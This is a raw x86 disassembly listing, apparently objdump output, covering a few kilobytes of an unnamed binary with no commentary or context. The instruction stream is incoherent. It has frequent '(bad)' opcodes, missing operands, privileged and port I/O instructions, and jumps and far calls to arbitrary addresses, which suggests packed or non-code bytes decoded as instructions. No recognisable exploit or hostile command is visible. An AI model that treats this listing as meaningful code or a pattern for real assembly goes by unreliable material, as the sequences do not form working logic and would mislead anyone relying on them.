  41ba24:	sbb    BYTE PTR [ecx+0x4a],bh
  41ba27:	(bad)  
  41ba28:	mov    ds:0xde770fa6,al
  41ba2d:	daa    
  41ba2e:	pop    esp
  41ba2f:	sub    BYTE PTR [ebp-0x11],0x68
  41ba33:	fdivr  st(7),st
  41ba35:	bswap  edi
  41ba37:	fst    QWORD PTR [eax-0x66]
  41ba3a:	xor    ch,BYTE PTR [esi-0x6d]
  41ba3d:	dec    ebp
  41ba3e:	ficomp DWORD PTR [ecx]
  41ba40:	ffree  st(7)
  41ba42:	mov    DWORD PTR [ecx],edx
  41ba44:	jge    0x41b9c6
  41ba46:	js     0x41b9d3
  41ba48:	enter  0x25e7,0xf1
  41ba4c:	fnsave [ecx-0x3c166afa]
  41ba52:	pop    es
  41ba53:	sbb    DWORD PTR [ecx+0x50],edi
  41ba56:	mov    WORD PTR [esi-0x3e],fs
  41ba59:	mov    edi,DWORD PTR ds:[ebx+0x22]
  41ba5d:	xor    al,0x4b
  41ba5f:	inc    ecx
  41ba60:	pop    ss
  41ba61:	mov    ebx,0x59b17705
  41ba66:	pusha  
  41ba67:	inc    ecx
  41ba68:	shl    DWORD PTR [eax],1
  41ba6a:	rcr    BYTE PTR [ecx+0x33],cl
  41ba6d:	sub    bl,ch
  41ba6f:	adc    eax,0xdaed9733
  41ba74:	ret    0x7b0c
  41ba77:	jne    0x41bab5
  41ba79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ba7a:	xchg   ebx,eax
  41ba7b:	mov    ah,0x1c
  41ba7d:	ss js  0x41ba39
  41ba80:	mov    edi,0x2340a446
  41ba85:	xchg   ebp,eax
  41ba86:	push   ebx
  41ba87:	out    0x21,eax
  41ba89:	sahf   
  41ba8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ba8b:	sub    dh,BYTE PTR [edi-0x505410ea]
  41ba91:	push   0xdb8cd4a
  41ba96:	jbe    0x41ba93
  41ba98:	in     al,0x3e
  41ba9a:	jg     0x41ba65
  41ba9c:	xchg   esi,eax
  41ba9d:	and    eax,0xf6002ec2
  41baa2:	fmul   QWORD PTR [edi]
  41baa4:	mov    dh,0x21
  41baa6:	popa   
  41baa7:	pop    ebp
  41baa8:	icebp  
  41baa9:	adc    ecx,ebp
  41baab:	mov    al,ds:0xfed04b21
  41bab0:	mov    ah,dl
  41bab2:	or     al,0xb6
  41bab4:	push   ecx
  41bab5:	in     al,dx
  41bab6:	sub    eax,0x1401d8ba
  41babb:	rol    bh,1
  41babd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41babe:	test   DWORD PTR [esi],0x7ca8449f
  41bac4:	clc    
  41bac5:	inc    esi
  41bac6:	fnstsw WORD PTR [ebp+0x24c0b994]
  41bacc:	mov    esp,0xfbc620f8
  41bad1:	lods   eax,DWORD PTR ds:[esi]
  41bad2:	pop    ebp
  41bad3:	fwait
  41bad4:	pop    esi
  41bad5:	cmp    ebp,esp
  41bad7:	sbb    eax,0xd14bd37f
  41badc:	test   dl,cl
  41bade:	call   0x32ee:0x18d8bc09
  41bae5:	mov    ds:0x6d87dd56,eax
  41baea:	mov    ah,0xb7
  41baec:	lds    ebx,FWORD PTR ds:0x77284439
  41baf2:	out    dx,al
  41baf3:	js     0x41ba9e
  41baf5:	icebp  
  41baf6:	sub    eax,0x4b951923
  41bafb:	cmp    eax,0x8910747e
  41bb00:	mov    ch,0x16
  41bb02:	inc    edi
  41bb03:	xor    dh,BYTE PTR [ebx-0x31]
  41bb06:	pop    ebp
  41bb07:	(bad)  
  41bb08:	scas   eax,DWORD PTR es:[edi]
  41bb09:	mov    ds:0x657129ae,eax
  41bb0e:	mov    ebx,0xb5bd4fc3
  41bb13:	push   esp
  41bb14:	mov    ebp,0xa73f3cbf
  41bb19:	jbe    0x41baae
  41bb1b:	xchg   esp,eax
  41bb1c:	fcomp  QWORD PTR [ecx]
  41bb1e:	or     al,0x1d
  41bb20:	das    
  41bb21:	into   
  41bb22:	mov    esi,0x2f8618cb
  41bb27:	fs cmps BYTE PTR es:[esi],BYTE PTR es:[edi]
  41bb2a:	test   al,0x85
  41bb2c:	jmp    0x9957df77
  41bb31:	pop    ds
  41bb32:	sub    DWORD PTR [ecx+ebx*4],ebp
  41bb35:	inc    esi
  41bb36:	add    al,0xb2
  41bb38:	add    eax,0xef86a6f0
  41bb3d:	push   ecx
  41bb3e:	xor    DWORD PTR [ebp+0x377b5bd5],eax
  41bb44:	pop    ss
  41bb45:	dec    edx
  41bb46:	push   es
  41bb47:	(bad)  
  41bb48:	and    al,0x38
  41bb4a:	pop    ds
  41bb4b:	sahf   
  41bb4c:	mov    esi,0x70775a20
  41bb51:	push   edi
  41bb52:	jg     0x41bb25
  41bb54:	pop    edx
  41bb55:	or     BYTE PTR [edx+0x689fedf6],al
  41bb5b:	scas   eax,DWORD PTR es:[edi]
  41bb5c:	test   DWORD PTR [edi-0x73],edi
  41bb5f:	adc    cl,BYTE PTR [edx]
  41bb61:	dec    edi
  41bb62:	cli    
  41bb63:	pop    ebx
  41bb64:	sti    
  41bb65:	add    BYTE PTR [eax-0x5b],dl
  41bb68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb69:	cmp    al,al
  41bb6b:	sti    
  41bb6c:	sbb    ebp,ecx
  41bb6e:	mov    eax,DWORD PTR [edi]
  41bb70:	push   es
  41bb71:	sub    ch,BYTE PTR [ecx+0x7ea861b9]
  41bb77:	push   esp
  41bb78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bb79:	add    dh,dh
  41bb7b:	sar    BYTE PTR [edi-0x17b7ece3],1
  41bb81:	push   esi
  41bb82:	xor    eax,0x9a526d95
  41bb87:	jne    0x41bb3f
  41bb89:	aad    0x99
  41bb8b:	bound  esi,QWORD PTR [edx]
  41bb8d:	push   0xcb491d59
  41bb92:	pop    esp
  41bb93:	ret    0x8c1c
  41bb96:	out    dx,eax
  41bb97:	add    al,0xa0
  41bb99:	mov    edi,0x14dbe938
  41bb9e:	and    BYTE PTR [ebx+0x5b],dl
  41bba1:	ret    
  41bba2:	jbe    0x41bb50
  41bba4:	fwait
  41bba5:	xchg   ecx,eax
  41bba6:	dec    esi
  41bba7:	shl    BYTE PTR [esi-0x1748576d],0x48
  41bbae:	mov    WORD PTR [esi],es
  41bbb0:	pop    eax
  41bbb1:	cld    
  41bbb2:	hlt    
  41bbb3:	fdiv   QWORD PTR [ebx-0x56]
  41bbb6:	mov    WORD PTR [edi+0x718a27eb],?
  41bbbc:	loope  0x41bb99
  41bbbe:	mov    ecx,0xabf33ddc
  41bbc3:	push   ss
  41bbc4:	and    al,0x41
  41bbc6:	je     0x41bb4c
  41bbc8:	add    eax,0x36b3fd37
  41bbcd:	mov    esp,0x5480a8b6
  41bbd2:	or     DWORD PTR [eax+ebp*2+0x6a43f42f],esp
  41bbd9:	inc    eax
  41bbda:	cmp    al,0x18
  41bbdc:	(bad)  
  41bbdd:	sbb    BYTE PTR [ebx+0x41],dh
  41bbe0:	(bad)  
  41bbe2:	push   edi
  41bbe3:	inc    ecx
  41bbe4:	fistp  DWORD PTR [ebx]
  41bbe6:	adc    BYTE PTR [esi-0x45fc7dd9],dh
  41bbec:	cmp    ebp,edi
  41bbee:	xchg   esi,eax
  41bbef:	pop    esi
  41bbf0:	push   esi
  41bbf1:	pop    eax
  41bbf2:	imul   ebp,edx,0x52
  41bbf5:	xor    eax,0xf184c397
  41bbfa:	ins    BYTE PTR es:[edi],dx
  41bbfb:	inc    ebx
  41bbfc:	in     al,dx
  41bbfd:	cld    
  41bbfe:	daa    
  41bbff:	add    eax,eax
  41bc01:	xor    BYTE PTR [ecx+edi*4],0x28
  41bc05:	sub    edi,DWORD PTR [ecx-0x66]
  41bc08:	ret    0x6c53
  41bc0b:	xchg   bl,dl
  41bc0d:	xchg   ebp,eax
  41bc0e:	mov    DWORD PTR [ebx-0x55700a0d],ecx
  41bc14:	dec    eax
  41bc15:	mov    ch,0xc4
  41bc17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc18:	mov    dh,0x18
  41bc1a:	ret    
  41bc1b:	loop   0x41bc6b
  41bc1d:	inc    edx
  41bc1e:	int    0xd5
  41bc20:	inc    esi
  41bc21:	pop    eax
  41bc22:	hlt    
  41bc23:	lds    edx,FWORD PTR [eax-0x67]
  41bc26:	push   cs
  41bc27:	ds in  al,0xe9
  41bc2a:	aad    0x47
  41bc2c:	xchg   edx,eax
  41bc2d:	or     eax,0x4e066149
  41bc32:	hlt    
  41bc33:	jb     0x41bbeb
  41bc35:	sbb    DWORD PTR [ebx-0x2d9f75da],eax
  41bc3b:	out    0x55,al
  41bc3d:	test   DWORD PTR [ecx+ebx*2+0x69],ebp
  41bc41:	pop    ds
  41bc42:	jnp    0x41bcb0
  41bc44:	into   
  41bc45:	(bad)  
  41bc46:	aam    0xf2
  41bc48:	dec    eax
  41bc49:	repnz cmps BYTE PTR gs:[esi],BYTE PTR es:[edi]
  41bc4c:	cwde   
  41bc4d:	jg     0x41bc65
  41bc4f:	sbb    BYTE PTR [esi-0x484b3aba],dl
  41bc55:	dec    ebx
  41bc56:	adc    eax,DWORD PTR [edi+0x33]
  41bc59:	add    eax,0xb6d8ed8b
  41bc5e:	pop    ss
  41bc5f:	fisubr WORD PTR [ebp-0x7caae493]
  41bc65:	jb     0x41bcbe
  41bc67:	lods   eax,DWORD PTR gs:[esi]
  41bc69:	pop    edx
  41bc6a:	mov    ebp,0xd8ec9004
  41bc6f:	test   DWORD PTR [edi+0x6e],ebx
  41bc72:	sbb    DWORD PTR [ebp-0x41e791a4],ecx
  41bc78:	xchg   ecx,eax
  41bc79:	lods   eax,DWORD PTR ds:[esi]
  41bc7a:	sti    
  41bc7b:	add    esi,DWORD PTR [ecx+0x18]
  41bc7e:	leave  
  41bc7f:	fucom  st(5)
  41bc81:	out    dx,eax
  41bc82:	int3   
  41bc83:	mov    ebp,0xd10a50ed
  41bc88:	jnp    0x41bc1c
  41bc8a:	jl     0x41bcfd
  41bc8c:	fdivr  DWORD PTR [esi]
  41bc8e:	mov    edi,0x7c63d2fc
  41bc93:	and    ah,BYTE PTR [esi]
  41bc95:	mov    edx,0x75851373
  41bc9a:	test   al,0xef
  41bc9c:	pop    es
  41bc9d:	or     al,0xf3
  41bc9f:	das    
  41bca0:	pop    esp
  41bca1:	and    al,0x73
  41bca3:	lahf   
  41bca4:	sbb    BYTE PTR [esi+0x6accf707],0x6d
  41bcab:	sbb    esp,DWORD PTR [ebx]
  41bcad:	adc    eax,0xededc9c4
  41bcb2:	add    edi,ebx
  41bcb4:	and    BYTE PTR [ebx],ah
  41bcb6:	iretw  
  41bcb8:	dec    esi
  41bcb9:	shl    BYTE PTR [edi-0x8],cl
  41bcbc:	pop    ecx
  41bcbd:	repz mov ecx,0x9efb37f4
  41bcc3:	and    edx,DWORD PTR [eax]
  41bcc5:	push   cs
  41bcc6:	mov    ebp,eax
  41bcc8:	rcr    edi,1
  41bcca:	repnz and bl,BYTE PTR [ebp+0x7c]
  41bcce:	sub    al,0x29
  41bcd0:	fmulp  st(1),st
  41bcd2:	out    0xec,eax
  41bcd4:	pop    ecx
  41bcd5:	mov    edi,?
  41bcd7:	test   DWORD PTR [edx],ecx
  41bcd9:	xchg   esi,eax
  41bcda:	jae    0x41bcc5
  41bcdc:	in     eax,0x2d
  41bcde:	ja     0x41bcd8
  41bce0:	sbb    BYTE PTR [esi],ah
  41bce2:	fisttp WORD PTR [edx-0x46b0ec45]
  41bce8:	sub    al,0x6f
  41bcea:	popf   
  41bceb:	push   es
  41bcec:	cld    
  41bced:	inc    esi
  41bcee:	(bad)  
  41bcef:	in     eax,dx
  41bcf0:	push   cs
  41bcf1:	inc    edi
  41bcf2:	or     cl,ah
  41bcf4:	mov    dl,0x53
  41bcf6:	xchg   ebp,eax
  41bcf7:	gs push esp
  41bcf9:	push   edx
  41bcfa:	imul   esp,ecx,0x7
  41bcfd:	mov    bl,0xaa
  41bcff:	xor    ebx,DWORD PTR [esi-0x56]
  41bd02:	cmc    
  41bd03:	ret    
  41bd04:	aam    0x28
  41bd06:	and    ebp,DWORD PTR [edx]
  41bd08:	dec    ebp
  41bd09:	aad    0x73
  41bd0b:	add    al,0x1
  41bd0d:	add    eax,0x8a07282f
  41bd12:	and    eax,0xfa82a8da
  41bd17:	add    eax,0x98ceea28
  41bd1c:	sub    edi,ebp
  41bd1e:	add    eax,0xe8bdfdaf
  41bd23:	jne    0x41bcd6
  41bd25:	inc    esp
  41bd26:	mov    ecx,0xa1b698c8
  41bd2b:	stc    
  41bd2c:	or     eax,0x67cbfdf5
  41bd31:	ret    0xd208
  41bd34:	mov    ch,BYTE PTR [ecx+0x35e74d12]
  41bd3a:	hlt    
  41bd3b:	pop    ebx
  41bd3c:	ret    0xfe7d
  41bd3f:	cmp    al,0xcb
  41bd41:	push   ds
  41bd42:	icebp  
  41bd43:	iret   
  41bd44:	inc    ebx
  41bd45:	xor    edx,edi
  41bd47:	jecxz  0x41bd1b
  41bd49:	and    esp,DWORD PTR [eax+0x9fb0144]
  41bd4f:	or     dl,cl
  41bd51:	and    cl,BYTE PTR [esi+0x1fee0d2e]
  41bd57:	jbe    0x41bdd2
  41bd59:	addr16 popa 
  41bd5b:	jb     0x41bd6c
  41bd5d:	inc    ebx
  41bd5e:	push   es
  41bd5f:	mov    ds:0xc980bbf2,al
  41bd64:	iret   
  41bd65:	bound  esi,QWORD PTR [ebx+0x44]
  41bd68:	aas    
  41bd69:	and    ah,BYTE PTR [ecx]
  41bd6b:	arpl   si,bx
  41bd6d:	sar    esp,0xa6
  41bd70:	gs sub eax,0x70260f75
  41bd76:	xchg   BYTE PTR [edx],bl
  41bd78:	(bad)  
  41bd79:	sub    al,0xf8
  41bd7b:	and    BYTE PTR [edx-0x730cec0c],0x8c
  41bd82:	sub    eax,0x4ed0fec5
  41bd87:	mov    DWORD PTR [edi],ecx
  41bd89:	sbb    BYTE PTR [eax-0x68],bh
  41bd8c:	jbe    0x41bd33
  41bd8e:	add    al,0xe9
  41bd90:	int3   
  41bd91:	cld    
  41bd92:	mov    ds:0xb17a3b52,eax
  41bd97:	add    eax,0xb9b043b0
  41bd9c:	sub    al,0xf4
  41bd9e:	push   ds
  41bd9f:	sub    BYTE PTR [ebx-0x13],bh
  41bda2:	int    0xca
  41bda4:	jo     0x41be20
  41bda6:	popf   
  41bda7:	and    DWORD PTR [esp+ebx*8],edi
  41bdaa:	dec    eax
  41bdab:	hlt    
  41bdac:	ret    0x76a1
  41bdaf:	rsm    
  41bdb1:	imul   BYTE PTR [ebp-0x133e3cb9]
  41bdb7:	fnstenv [eax+ecx*1-0x5f]
  41bdbb:	dec    ebx
  41bdbc:	mov    ah,BYTE PTR [edi]
  41bdbe:	xor    ecx,esi
  41bdc0:	(bad)  
  41bdc2:	sbb    al,0x6f
  41bdc4:	add    ch,bl
  41bdc6:	push   ecx
  41bdc7:	clc    
  41bdc8:	jb     0x41be1f
  41bdca:	mov    ds:0xb8ade3e2,al
  41bdcf:	rcr    BYTE PTR [edx-0x1e],cl
  41bdd2:	rcl    DWORD PTR [ebx],cl
  41bdd4:	add    al,0x4c
  41bdd6:	(bad)  [edi+0x6b]
  41bdd9:	call   0x5c74e2cf
  41bdde:	lahf   
  41bddf:	jp     0x41bd6a
  41bde1:	pop    edi
  41bde2:	enter  0x233,0x95
  41bde6:	jge    0x41be40
  41bde8:	jge    0x41bdc5
  41bdea:	fnstsw WORD PTR [ebx-0x45]
  41bded:	jo     0x41bdc4
  41bdef:	cld    
  41bdf0:	cdq    
  41bdf1:	mov    ds:0xd373481f,al
  41bdf6:	mov    BYTE PTR [ecx-0x28],bl
  41bdf9:	call   0x67fb:0x46eff874
  41be00:	cmp    ecx,DWORD PTR [ebx]
  41be02:	jne    0x41bde5
  41be04:	jbe    0x41bdf9
  41be06:	jbe    0x41be85
  41be08:	or     eax,0x34f36d2d
  41be0d:	jecxz  0x41be67
  41be0f:	sti    
  41be10:	aas    
  41be11:	sbb    BYTE PTR [ebx-0xa874035],0xbb
  41be18:	xor    BYTE PTR [edi-0x6d1aae9f],ch
  41be1e:	shl    esp,cl
  41be20:	fstp   QWORD PTR [ebp+0x5041f326]
  41be26:	pop    es
  41be27:	ja     0x41be9c
  41be29:	ja     0x41be05
  41be2b:	aas    
  41be2c:	and    eax,0x932ac1ce
  41be31:	jmp    0x41be29
  41be33:	or     al,ah
  41be35:	push   cs
  41be36:	mov    edi,0x98e52244
  41be3b:	xor    al,0xe4
  41be3d:	inc    edx
  41be3e:	sbb    bl,BYTE PTR [edx+0x6b]
  41be41:	dec    edi
  41be42:	sub    DWORD PTR cs:[edx+0x60125566],edx
  41be49:	gs push esi
  41be4b:	lock push 0xffffffc0
  41be4e:	jle    0x41bde9
  41be50:	push   esp
  41be51:	inc    esp
  41be52:	adc    al,0xb3
  41be54:	loop   0x41bde4
  41be56:	and    dl,BYTE PTR [ecx+0x5902878a]
  41be5c:	loope  0x41bebe
  41be5e:	pop    esp
  41be5f:	cmp    eax,0x2d90d343
  41be64:	jo     0x41be19
  41be66:	or     dh,BYTE PTR [ecx]
  41be68:	iret   
  41be69:	sub    al,0xbe
  41be6b:	retf   
  41be6c:	test   ebp,esi
  41be6e:	out    0x6a,eax
  41be70:	adc    eax,0x290ab7fd
  41be75:	jno    0x41be16
  41be77:	mov    bl,0x5
  41be79:	sbb    al,0xb2
  41be7b:	sbb    BYTE PTR [esi-0x13],ah
  41be7e:	aad    0xf3
  41be80:	in     eax,dx
  41be81:	dec    eax
  41be82:	adc    bl,BYTE PTR [ebx-0x3a]
  41be85:	ins    BYTE PTR es:[edi],dx
  41be86:	retf   0x1697
  41be89:	mov    esi,0xa0c65027
  41be8e:	jg     0x41be4c
  41be90:	pop    es
  41be91:	mov    al,0xd7
  41be93:	mov    ebp,0x1e89f7e8
  41be98:	sar    dh,0x77
  41be9b:	inc    ebx
  41be9c:	popa   
  41be9d:	ror    al,cl
  41be9f:	or     al,0x39
  41bea1:	sbb    bh,bh
  41bea3:	sub    al,0xab
  41bea5:	inc    esi
  41bea6:	xchg   ecx,eax
  41bea7:	add    DWORD PTR [esi],ebx
  41bea9:	or     eax,DWORD PTR [ecx+0x2854edd2]
  41beaf:	dec    edi
  41beb0:	add    BYTE PTR [ecx],ch
  41beb2:	ds push 0x74
  41beb5:	cmp    edx,DWORD PTR [eax+0x1]
  41beb8:	jge    0x41beca
  41beba:	xchg   ecx,eax
  41bebb:	popf   
  41bebc:	aas    
  41bebd:	add    ch,BYTE PTR [ecx+0x50]
  41bec0:	ss leave 
  41bec2:	sub    eax,0xa36f86fc
  41bec7:	jl     0x41be81
  41bec9:	dec    ebp
  41beca:	lods   al,BYTE PTR ds:[esi]
  41becb:	adc    ecx,0xffffffe8
  41bece:	outs   dx,BYTE PTR ds:[esi]
  41becf:	add    DWORD PTR [ecx-0x6f8bab7b],esp
  41bed5:	jbe    0x41be8f
  41bed7:	jp     0x41bebd
  41bed9:	pop    ebx
  41beda:	call   0xb82b:0x6c6d6c29
  41bee1:	jmp    0xb2e460e6
  41bee6:	mov    dh,0x4b
  41bee8:	call   0x4899:0x8700c959
  41beef:	in     al,0xf8
  41bef1:	loope  0x41befd
  41bef3:	mov    eax,0x6acd5216
  41bef8:	lock or al,0xd4
  41befb:	ins    DWORD PTR es:[edi],dx
  41befc:	pop    edx
  41befd:	pop    ebx
  41befe:	(bad)  
  41beff:	push   0x63976ef8
  41bf04:	not    edx
  41bf06:	ror    BYTE PTR [esp+edx*4+0x3880cc77],1
  41bf0d:	in     al,dx
  41bf0e:	jge    0x41bed1
  41bf10:	popa   
  41bf11:	outs   dx,DWORD PTR ds:[esi]
  41bf12:	sbb    eax,0xab59ed41
  41bf17:	int3   
  41bf18:	mov    ds:0x9ba38751,al
  41bf1d:	jp     0x41bf0b
  41bf1f:	sub    DWORD PTR [edi],esi
  41bf21:	arpl   bp,di
  41bf23:	sbb    BYTE PTR cs:[esi-0x1f],cl
  41bf27:	ja     0x41bf52
  41bf29:	sbb    eax,0x4091b10a
  41bf2e:	dec    ecx
  41bf2f:	add    edi,DWORD PTR ds:0x8fe67922
  41bf35:	jno    0x41bf92
  41bf37:	xchg   ebp,eax
  41bf38:	enter  0xc06a,0x6c
  41bf3c:	mov    ebp,0x9a8b6f2e
  41bf41:	dec    ebp
  41bf42:	mov    ?,WORD PTR [esi-0x5c]
  41bf45:	pop    ss
  41bf46:	and    al,0xaf
  41bf48:	pusha  
  41bf49:	jmp    0xe734:0xa8448a5f
  41bf50:	lahf   
  41bf51:	cmc    
  41bf52:	inc    edi
  41bf53:	mov    ?,WORD PTR [esi-0x1]
  41bf56:	jbe    0x41bee5
  41bf58:	pop    eax
  41bf59:	and    al,0xb3
  41bf5b:	or     al,0xa3
  41bf5d:	sbb    bl,BYTE PTR [eax]
  41bf5f:	imul   eax,ebp,0x197cb249
  41bf65:	mov    ebx,ecx
  41bf67:	int3   
  41bf68:	xchg   ecx,eax
  41bf69:	ror    DWORD PTR [ecx],cl
  41bf6b:	mov    ecx,0xe232f92b
  41bf70:	and    esp,DWORD PTR [edx+0x12ec7a38]
  41bf76:	dec    esi
  41bf77:	in     al,0xa4
  41bf79:	lea    edx,[edx+0x40b44cca]
  41bf7f:	mov    ecx,0xfa755596
  41bf84:	or     edx,edi
  41bf86:	jbe    0x41bf87
  41bf88:	shr    dl,0x92
  41bf8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bf8c:	loope  0x41c000
  41bf8e:	bound  esi,QWORD PTR [edi-0x4e]
  41bf91:	sub    al,0xa5
  41bf93:	lea    eax,cs:[ebx+0x77acf420]
  41bf9a:	shr    BYTE PTR ds:0xe53d7c7a,1
  41bfa0:	call   0xa86976a5
  41bfa5:	mov    ebp,0x3bfc0ba8
  41bfaa:	dec    edi
  41bfab:	test   DWORD PTR [edi],esp
  41bfad:	(bad)  
  41bfae:	dec    esp
  41bfaf:	mov    cl,0x48
  41bfb1:	imul   ebx,esi,0xfbbdfc25
  41bfb7:	ja     0x41c033
  41bfb9:	lods   al,BYTE PTR ds:[esi]
  41bfba:	ss pop ss
  41bfbc:	mov    ecx,0xd599033b
  41bfc1:	jno    0x41bf80
  41bfc3:	mov    esi,?
  41bfc5:	cmp    DWORD PTR [ebp+0x61],ecx
  41bfc8:	retf   0x9b17
  41bfcb:	in     eax,dx
  41bfcc:	cmp    BYTE PTR [ebx+edx*2-0x1b],bl
  41bfd0:	sub    BYTE PTR [ebp+edx*8+0x4bfe2f51],0xc0
  41bfd8:	stos   BYTE PTR es:[edi],al
  41bfd9:	pop    eax
  41bfda:	data16 (bad) 
  41bfdc:	out    dx,al
  41bfdd:	ret    
  41bfde:	mov    bh,0x48
  41bfe0:	adc    eax,0x41f13032
  41bfe5:	and    ebx,DWORD PTR [ebx]
  41bfe7:	fld    TBYTE PTR [ebp-0x72141b66]
  41bfed:	jbe    0x41c016
  41bfef:	arpl   WORD PTR [edi+0x2ff5f49d],sp
  41bff5:	sub    al,0x78
  41bff7:	data16 or al,0x16
  41bffa:	and    DWORD PTR [ebp-0x7c89207b],eax
  41c000:	pop    ss
  41c001:	sbb    eax,0x5c2ef8a7
  41c006:	mov    cl,0x44
  41c008:	outs   dx,DWORD PTR ds:[esi]
  41c009:	repnz or edx,DWORD PTR [esi+0x23]
  41c00d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c00e:	(bad)  
  41c010:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c011:	mov    ebp,0x624fb707
  41c016:	fimul  WORD PTR [edx+ebx*4]
  41c019:	push   cs
  41c01a:	inc    edx
  41c01b:	sbb    eax,0x3ebbb0a2
  41c020:	aaa    
  41c021:	mov    ch,0xe3
  41c023:	jge    0x41c00e
  41c025:	add    al,0xdf
  41c027:	sub    edi,DWORD PTR [esi+eax*8]
  41c02a:	imul   edx,DWORD PTR [edi+0x5deefd7],0x1d
  41c031:	sbb    eax,0xedd8ac7f
  41c036:	addr16 or dl,dl
  41c039:	mov    al,ds:0x72754527
  41c03e:	sub    DWORD PTR [edx+0x2801a85a],ebx
  41c044:	int3   
  41c045:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c046:	js     0x41c056
  41c048:	packssdw mm5,QWORD PTR [ebp+0x2d]
  41c04c:	lods   al,BYTE PTR ds:[esi]
  41c04d:	in     eax,dx
  41c04e:	add    ecx,DWORD PTR [esi+0x71]
  41c051:	shl    DWORD PTR [edx+ecx*2-0x1e],cl
  41c055:	fdiv   st,st(2)
  41c057:	lods   al,BYTE PTR ds:[esi]
  41c058:	or     al,0x5c
  41c05a:	mov    esp,0x9274a7bf
  41c05f:	gs cmc 
  41c061:	int3   
  41c062:	jmp    0x319796e0
  41c067:	lahf   
  41c068:	and    DWORD PTR [ebx],edx
  41c06a:	loop   0x41c0e7
  41c06c:	lock xchg ecx,eax
  41c06e:	into   
  41c06f:	dec    edi
  41c070:	dec    ebp
  41c071:	jmp    0x222e:0x8aef3806
  41c078:	dec    edi
  41c079:	adc    edi,DWORD PTR fs:[edi]
  41c07c:	or     BYTE PTR [ebp+0x5],ah
  41c07f:	mov    edi,DWORD PTR [edi+0xfed97e4]
  41c085:	xor    eax,0x714c5ddf
  41c08a:	adc    dl,ch
  41c08c:	iret   
  41c08d:	ins    DWORD PTR es:[edi],dx
  41c08e:	ffreep st(4)
  41c090:	push   eax
  41c091:	mov    BYTE PTR [eax],al
  41c093:	xchg   ecx,eax
  41c094:	sahf   
  41c095:	sar    DWORD PTR [ebp-0x4c],cl
  41c098:	sar    BYTE PTR [esi-0x73],cl
  41c09b:	pushf  
  41c09c:	je     0x41c048
  41c09e:	lock scas al,BYTE PTR es:[edi]
  41c0a0:	mov    dh,BYTE PTR [esi]
  41c0a2:	loop   0x41c0ec
  41c0a4:	sbb    DWORD PTR [eax],0xf1d55125
  41c0aa:	push   0xfffffffc
  41c0ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c0ad:	test   al,0x28
  41c0af:	stc    
  41c0b0:	aaa    
  41c0b1:	ins    DWORD PTR es:[edi],dx
  41c0b2:	fxch   st(4)
  41c0b4:	cmp    DWORD PTR [eax+0x28e62245],ebp
  41c0ba:	inc    ebx
  41c0bb:	mov    ah,0x2
  41c0bd:	pusha  
  41c0be:	cld    
  41c0bf:	cmp    DWORD PTR ds:0xe1b4cb8d,ebx
  41c0c5:	and    DWORD PTR ds:0xbe3d99fa,ebp
  41c0cb:	ss adc BYTE PTR gs:[ebx+0x61],bh
  41c0d0:	or     dl,BYTE PTR [ebx+0x22]
  41c0d3:	mov    DWORD PTR [eax-0x57b63291],esi
  41c0d9:	cmp    bh,BYTE PTR [edi-0x234008d2]
  41c0df:	fist   WORD PTR [ecx]
  41c0e1:	pop    esp
  41c0e2:	xchg   BYTE PTR ds:0x3ebb3a75,dh
  41c0e8:	je     0x41c0f1
  41c0ea:	nop
  41c0eb:	mov    eax,eax
  41c0ed:	repz retf 0x89da
  41c0f1:	jp     0x41c15b
  41c0f3:	xchg   esp,eax
  41c0f4:	inc    ebp
  41c0f5:	loope  0x41c147
  41c0f7:	sbb    BYTE PTR [esi],ch
  41c0f9:	pop    edi
  41c0fa:	fdiv   st,st(0)
  41c0fc:	xor    DWORD PTR [edi+0x74],ecx
  41c0ff:	mov    bh,0xa5
  41c101:	stos   BYTE PTR es:[edi],al
  41c102:	loop   0x41c0d4
  41c104:	out    0xf4,al
  41c106:	stos   DWORD PTR es:[edi],eax
  41c107:	mov    ah,0x74
  41c109:	mov    cl,0x28
  41c10b:	dec    esp
  41c10c:	mov    esi,0x28d63d56
  41c111:	cmp    al,0x4
  41c113:	jp     0x41c096
  41c115:	sbb    eax,0x5fe14da9
  41c11a:	xchg   ecx,eax
  41c11b:	nop
  41c11c:	(bad)  
  41c11e:	test   al,0x17
  41c120:	jmp    0x28141682
  41c125:	mov    ?,WORD PTR [edx]
  41c127:	jmp    0x41c16e
  41c129:	sti    
  41c12a:	inc    esp
  41c12b:	jo     0x41c15b
  41c12d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c12e:	fucomi st,st(7)
  41c130:	lock shr DWORD PTR [edx],0xce
  41c134:	inc    ebp
  41c135:	pop    esp
  41c136:	and    bh,BYTE PTR [ebx-0x68b4d97b]
  41c13c:	mov    ecx,0x826dec3c
  41c141:	pusha  
  41c142:	push   esi
  41c143:	cmp    DWORD PTR [ecx],ebx
  41c145:	fstp   DWORD PTR [eax-0x6e43d830]
  41c14b:	add    al,0x59
  41c14d:	cmp    DWORD PTR [eax+0x39],eax
  41c150:	pop    ebx
  41c151:	dec    esp
  41c152:	push   0xed47716c
  41c157:	mov    dh,0xfa
  41c159:	xor    al,0x88
  41c15b:	sub    BYTE PTR [esi],ch
  41c15d:	ins    DWORD PTR es:[edi],dx
  41c15e:	inc    esp
  41c15f:	sti    
  41c160:	sub    ebp,DWORD PTR [ebx+0x697cc9b7]
  41c166:	cmp    eax,0xd7807bed
  41c16b:	jb     0x41c192
  41c16d:	into   
  41c16e:	and    edx,DWORD PTR [edi+0x45]
  41c171:	xlat   BYTE PTR ds:[ebx]
  41c172:	hlt    
  41c173:	xor    edi,edi
  41c175:	std    
  41c176:	or     eax,0x392304b6
  41c17b:	(bad)  
  41c17c:	fnsave [ebp-0x38]
  41c17f:	mov    ch,0x20
  41c181:	rol    DWORD PTR [ecx],cl
  41c183:	or     ch,BYTE PTR [eax+0x51]
  41c186:	push   edx
  41c187:	mov    ebx,0x4fc5b855
  41c18c:	or     eax,0x663e2889
  41c191:	mov    edx,0x87f9b313
